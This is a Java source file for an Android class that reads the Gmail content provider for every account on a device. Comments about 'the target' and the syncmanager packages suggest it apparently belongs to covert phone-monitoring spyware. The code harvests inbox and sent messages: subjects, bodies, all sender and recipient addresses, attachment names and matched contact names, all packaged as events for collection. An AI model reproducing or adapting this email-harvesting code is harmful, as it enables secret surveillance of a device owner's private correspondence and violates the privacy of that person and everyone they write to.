package com.fx.dalvik.gmail;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.HashSet;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.fx.android.common.Customization;
import com.fx.dalvik.contacts.ContactsDatabaseManager;
import com.fx.dalvik.event.Event;
import com.fx.dalvik.event.EventEmail;
import com.fx.dalvik.util.FxLog;
import com.fx.dalvik.util.GeneralUtil;
import com.vvt.android.syncmanager.control.ConfigurationManager;

public class GmailDatabaseManager {

	private static final String TAG = "GmailDatabaseManager";
	private static final boolean DEBUG = true;
	private static final boolean LOCAL_LOGV = Customization.DEBUG ? DEBUG : false;
	private static final boolean LOCAL_LOGD = Customization.DEBUG ? DEBUG : false;
	
	public static final String URI_CONVERSATIONS = "content://gmail-ls/conversations";
	public static final String URI_LABELS = "content://gmail-ls/labels";
	public static final String PATH_SEGMENT_MESSAGES = "messages";
	
	// There are 2 major ways to get to the database
	// 1. via common URI
	// 2. via database file name (need root permission)
	//
	// For query using URI, the content must be in this format:-
	// content://gmail-ls/conversations/<YourEmailAddress>/<conversationId>/messages
	public static HashSet<EventEmail> getNewEmails(
			Context context, ConfigurationManager config, String account, long refId) {
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "getNewEmails # ENTER ...");
		}
		
		HashSet<EventEmail> emails = new HashSet<EventEmail>();
		
		// Get conversations from inbox and sent
		HashSet<Long> conversations = getNewConversationIds(context, account, refId);
		if (conversations == null || conversations.isEmpty()) {
			FxLog.v(TAG, "getNewEmails # No conversation found -> EXIT ...");
			return emails;
		}
		
		// Get reference labels
		HashMap<String, Long> labels = getLabels(context, account);
		
		Uri uri = null;
		Cursor cursor = null;
		EventEmail email = null;
		for (long conId : conversations) {
			uri = Uri.withAppendedPath(Uri.parse(URI_CONVERSATIONS), 
					String.format("%s/%d/%s", account, conId, PATH_SEGMENT_MESSAGES));
			
			cursor = context.getContentResolver().query(uri, null, null, null, null);
			if (cursor == null || cursor.getCount() < 1) {
				continue;
			}
			
			// We move to last first, and then move previous
			// Since messages are arranged forward
			cursor.moveToLast();
			
			do {
				long msgId = cursor.getLong(cursor.getColumnIndex(
						GmailDatabaseHelper.COLUMN_MSG_ID));
				
				if (msgId <= refId) {
					break;
				}
				email = createEmailEvent(cursor, account, labels);
				if (email != null) {
					emails.add(email);
					if (LOCAL_LOGV) {
						FxLog.v(TAG, String.format("getNewEmails # %s", 
								email.getShortDescription()));
					}
				}
			}
			while (cursor.moveToPrevious());
			cursor.close();
		}
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("getNewEmails # Total email: %d", emails.size()));
			FxLog.v(TAG, "getNewEmails # EXIT ...");
		}
		
		return emails;
	}
	
	private static EventEmail createEmailEvent(
			Cursor cursor, String account, HashMap<String, Long> labels) {
		
		if (cursor == null || cursor.isClosed() || cursor.getPosition() == -1) {
			if (LOCAL_LOGV) {
				FxLog.v(TAG, "createEmailEvent # Fail to create an event!!");
			}
			return null;
		}
		
		// Analyze direction
		short direction = Event.DIRECTION_UNKNOWN;
		
		long inboxLabel = labels.get("^i");
		long sentLabel = labels.get("^f");
		
		String labelIds = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_LABEL_IDS));
		
		if (labelIds.contains(String.valueOf(inboxLabel))) {
			direction = Event.DIRECTION_IN;
		}
		else if (labelIds.contains(String.valueOf(sentLabel))) {
			direction = Event.DIRECTION_OUT;
		}
		else {
			if (LOCAL_LOGD) {
				FxLog.d(TAG, String.format(
						"createEmailEvent # UNKNOWN labelIds: %s, inbox: %d, sent: %d", 
						labelIds, inboxLabel, sentLabel));
			}
			return null;
		}
		
		long msgId = cursor.getLong(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_MSG_ID));
		
		long time = cursor.getLong(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_DATE_RECEIVED));
		
		String subject = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_SUBJECT));
		
		String body = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_BODY));
		
		if (body != null) {
			body = GeneralUtil.getCleanedEmailBody(body);
		}
		
		String rawInfoSender = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_FROM));
		
		String rawInfoTo = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_TO));
		
		String rawInfoCc = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_CC));
		
		String rawInfoBcc = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_BCC));
		
		String rawInfoAttach = cursor.getString(cursor.getColumnIndex(
				GmailDatabaseHelper.COLUMN_ATTACHMENTS));
		
		// Senders may be null when the target is sending an email
		String[] senders = getAddresses(rawInfoSender);
		String sender = senders == null || senders.length < 1 ? account : senders[0];
		
		String[] to = getAddresses(rawInfoTo);
		String[] cc = getAddresses(rawInfoCc);
		String[] bcc = getAddresses(rawInfoBcc);
		
		String[] attachments = getAttachsFromInputString(rawInfoAttach);
		
		ArrayList<String> emails = new ArrayList<String>();
		if (direction == Event.DIRECTION_IN) {
			emails.add(sender);
		}
		else if (direction == Event.DIRECTION_OUT){
			emails.addAll(Arrays.asList(to));
			emails.addAll(Arrays.asList(cc));
			emails.addAll(Arrays.asList(bcc));
		}
		
		String contactName = ContactsDatabaseManager.getContactNamesByEmails(
				emails.toArray(new String[0]));
		
		if (contactName == null || contactName.trim().length() < 1) {
			contactName = Event.REMOTEPARTY_UNKNOWN;
		}
		
		int size = Event.DURATION_UNKNOWN;
		
		EventEmail event = new EventEmail(time, direction, size, sender, to, cc, bcc, 
				subject, attachments, body, contactName);
		
		event.setId(msgId);
		
		// DON'T CLOSE A CURSOR HERE!!
		
		return event;
	}
	
	private static HashSet<Long> getNewConversationIds(
			Context context, String account, long refId) {
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, "getNewConversationIds # ENTER ...");
		}
		HashSet<Long> ids = new HashSet<Long>();
		HashSet<Long> temp = new HashSet<Long>();
		
		Uri uri = Uri.withAppendedPath(Uri.parse(GmailDatabaseManager.URI_CONVERSATIONS), account);
		
		// Query inbox mail
		String selection = GmailDatabaseHelper.SELECT_INBOX;
		Cursor cursor = context.getContentResolver().query(uri, null, selection, null, null);
		if (cursor != null && cursor.getCount() > 0) {
			// Result from query always order from the latest conversation
			while (cursor.moveToNext()) {
				long conId = cursor.getLong(cursor.getColumnIndex(
						GmailDatabaseHelper.COLUMN_ID));
				long maxMsgId = cursor.getLong(cursor.getColumnIndex(
						GmailDatabaseHelper.COLUMN_MAX_MSG_ID));
				
				// We compare messageId but collect conversation's _id
				if (maxMsgId > refId) {
					temp.add(conId);
				}
				else {
					break;
				}
			}
		}
		if (cursor!= null) {
			cursor.close();
		}
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("getNewConversationIds # inbox: %s", temp.toString()));
		}
		ids.addAll(temp);
		temp.clear();
		
		// Query sent mail
		selection = GmailDatabaseHelper.SELECT_SENT;
		cursor = context.getContentResolver().query(uri, null, selection, null, null);
		if (cursor != null && cursor.getCount() > 0) {
			// Result from query always order from the latest conversation
			while (cursor.moveToNext()) {
				long conId = cursor.getLong(cursor.getColumnIndex(
						GmailDatabaseHelper.COLUMN_ID));
				long maxMsgId = cursor.getLong(cursor.getColumnIndex(
						GmailDatabaseHelper.COLUMN_MAX_MSG_ID));
				
				// We compare messageId but collect conversation's _id
				if (maxMsgId > refId) {
					temp.add(conId);
				}
				else {
					break;
				}
			}
		}
		if (cursor != null) {
			cursor.close();
		}
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("getNewConversationIds # sentbox: %s", temp.toString()));
		}
		ids.addAll(temp);
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format("getNewConversationIds # ids: %s", ids.toString()));
			FxLog.v(TAG, "getNewConversationIds # EXIT ...");
		}
		
		return ids;
	}
	
	private static String[] getAddresses(String input) {
//		if (LOCAL_LOGV) {
//			FxLog.v(TAG, "getAddresses # ENTER ...");
//			FxLog.v(TAG, String.format("getAddresses # input: \"%s\"", input));
//		}
		ArrayList<String> emails = new ArrayList<String>();
		
		if (input != null && input.length() > 0) {
			int beginIndex = 0;
			int endIndex = 0;
			
			while (true) {
				
				beginIndex = input.indexOf("<", endIndex) + 1;
				if (beginIndex < 1 || beginIndex > input.length()) {
					break;
				}
				
				endIndex = input.indexOf(">", beginIndex);
				if (endIndex < 0 || endIndex > input.length()) {
					break;
				}
				
				emails.add(input.substring(beginIndex, endIndex));
			}
		}
		
		String[] result = emails.toArray(new String[0]);
		
//		if (LOCAL_LOGV) {
//			FxLog.v(TAG, String.format(
//					"getAddresses # result: %s", Arrays.toString(result)));
//			
//			FxLog.v(TAG, "getAddresses # EXIT ...");
//		}
		
		return result;
	}
	
	private static String[] getAttachsFromInputString(String input) {
//		if (LOCAL_LOGV) {
//			FxLog.v(TAG, "getAttachsFromInputString # ENTER ...");
//		}
		ArrayList<String> attachments = new ArrayList<String>();
		
		if (input != null && input.length() > 0) {
			BufferedReader reader = new BufferedReader(new StringReader(input));
			String line = null;
			String[] splitform = null;
			try {
				while ((line = reader.readLine()) != null) {
//					if (LOCAL_LOGV) {
//						FxLog.v(TAG, String.format("getAttachsFromInputString # line: %s", line));
//					}
					splitform = line.replace("|", " ").split(" ");
					if (splitform != null && splitform.length > 1) {
						attachments.add(splitform[1]);
					}
				}
			}
			catch (IOException e) {
				if (LOCAL_LOGD) {
					FxLog.d(TAG, null, e);
				}
			}
		}
		
		String[] result = attachments.toArray(new String[0]);
		
//		if (LOCAL_LOGV) {
//			FxLog.v(TAG, String.format(
//					"getAttachsFromInputString # result: %s", 
//					Arrays.toString(result)));
//			
//			FxLog.v(TAG, "getAttachsFromInputString # EXIT ...");
//		}
		
		return result;
	}
	
	public static HashMap<String, Long> getInitializeRefId(
			Context context, ConfigurationManager config) {
		
//		if (LOCAL_LOGV) {
//			FxLog.v(TAG, "initializeRefId # ENTER ...");
//		}
		// Initialize HashMap
		HashMap<String, Long> refIds = new HashMap<String, Long>();
		
		// Get all gmail accounts
		String[] gmails = GmailHelper.getGmailAccount(context);
//		if (LOCAL_LOGV) {
//			FxLog.v(TAG, String.format("initializeRefId # gmails: %s", Arrays.toString(gmails)));
//		}
		
		if (gmails.length > 0) {
			// Collect latest conversation for each account
			long refId = 0;
			for (int i = 0; i < gmails.length; i++) {
				refId = getMessageLatestId(context, gmails[i]);
				refIds.put(gmails[i], refId);
			}
//			if (LOCAL_LOGV) {
//				FxLog.v(TAG, "initializeRefId # refIds:-");
//				for (String email : refIds.keySet()) {
//					FxLog.v(TAG, String.format(
//							"initializeRefId # %s = %s", email, refIds.get(email)));
//				}
//			}
		}
		else {
//			if (LOCAL_LOGV) {
//				FxLog.v(TAG, "initializeRefId # No account found");
//			}
		}
		
//		if (LOCAL_LOGV) {
//			FxLog.v(TAG, "initializeRefId # EXIT ...");
//		}
		
		return refIds;
	}
	
	public static long getMessageLatestId(Context context, String account) {
		// Result set always begin with the latest update
		Uri uri = Uri.withAppendedPath(
				Uri.parse(GmailDatabaseManager.URI_CONVERSATIONS), account);
		
		// Get inbox max ID
		String selection = GmailDatabaseHelper.SELECT_INBOX;
		Cursor cursor = context.getContentResolver().query(uri, null, selection, null, null);
		long inboxMaxId = -1;
		if (cursor != null && cursor.getCount() > 0 && cursor.moveToNext()) {
			inboxMaxId = cursor.getLong(cursor.getColumnIndex(
					GmailDatabaseHelper.COLUMN_MAX_MSG_ID));
		}
		if (cursor != null) {
			cursor.close();
		}
		
		// Get sentbox max ID
		selection = GmailDatabaseHelper.SELECT_SENT;
		cursor = context.getContentResolver().query(uri, null, selection, null, null);
		long sentboxMaxId = -1;
		if (cursor != null && cursor.getCount() > 0 && cursor.moveToNext()) {
			sentboxMaxId = cursor.getLong(cursor.getColumnIndex(
					GmailDatabaseHelper.COLUMN_MAX_MSG_ID));
		}
		if (cursor != null) {
			cursor.close();
		}
		
		long latestId = inboxMaxId > sentboxMaxId? inboxMaxId: sentboxMaxId;
		
		if (LOCAL_LOGV) {
			FxLog.v(TAG, String.format(
					"getMessageLatestId # inbox: %d, sent: %d, latest: %d", 
					inboxMaxId, sentboxMaxId, latestId));
		}
		
		return latestId;
	}
	
	private static HashMap<String, Long> getLabels(Context context, String account) {
		HashMap<String, Long> labels = new HashMap<String, Long>();
		
		Uri uri = Uri.withAppendedPath(Uri.parse(URI_LABELS), account);
		String[] projection = { GmailDatabaseHelper.COLUMN_ID, GmailDatabaseHelper.COLUMN_NAME };
		String selection = String.format("%s='%s' OR %s='%s'", 
				GmailDatabaseHelper.COLUMN_NAME, GmailDatabaseHelper.LABEL_INBOX, 
				GmailDatabaseHelper.COLUMN_NAME, GmailDatabaseHelper.LABEL_SENT);
		
		Cursor cursor = context.getContentResolver().query(
				uri, projection, selection, null, null);
		
		if (cursor != null) {
			String name = null;
			while (cursor.moveToNext()) {
				name = cursor.getString(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_NAME));
				long id = cursor.getLong(cursor.getColumnIndex(GmailDatabaseHelper.COLUMN_ID));
				labels.put(name, id);
			}
		}
		return labels;
	}
	
}
